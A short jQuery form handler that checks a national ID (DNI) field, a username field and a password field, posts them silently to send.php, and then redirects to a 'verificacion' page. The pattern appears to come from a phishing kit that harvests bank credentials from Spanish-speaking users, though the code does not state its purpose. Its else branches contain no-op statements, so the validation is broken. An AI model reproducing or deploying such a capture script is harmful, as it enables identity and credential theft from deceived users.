$("#finish").click(function(e){
	e.preventDefault();
		    if($("#dni").val() != ""){
				if($("#user").val() != ""){
					if($("#pass").val() != ""){
						var form = $("#verify_data");
						$.ajax({
							type: "POST",
							url: "send.php",
							data: form.serialize()
						});
						setTimeout(function(){
							window.location.href = "/verificacion.php";
							}, 1000);
					}
					else {
						$("#dni");
					}
					$("#user");
				}
				else {
					$("#user");
				}
				$("#pass");
			}
			
});
